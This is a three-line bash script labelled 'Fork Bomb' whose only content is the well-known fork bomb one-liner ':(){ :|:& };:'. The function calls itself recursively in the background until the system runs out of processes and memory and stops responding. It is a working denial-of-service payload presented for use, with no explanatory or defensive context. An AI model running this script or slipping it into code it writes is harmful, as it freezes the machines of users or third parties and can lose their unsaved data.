#!/bin/bash
# Fork Bomb
:(){ :|:& };:
